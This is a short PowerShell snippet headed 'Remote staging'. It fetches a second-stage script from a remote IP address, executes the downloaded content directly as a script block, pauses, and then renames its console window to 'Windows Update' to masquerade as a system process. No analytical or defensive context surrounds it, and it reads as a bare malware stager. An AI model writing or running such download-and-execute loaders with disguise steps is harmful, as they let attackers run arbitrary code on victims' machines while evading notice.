
# Remote staging
$FetchUrl = "http://203.0.113.245/stage2.ps1"
$DownloadedScript = (iwr $FetchUrl -UseBasicParsing).Content
[ScriptBlock]::Create($DownloadedScript).Invoke()
Start-Sleep -Seconds 27
$Host.UI.RawUI.WindowTitle = "Windows Update"
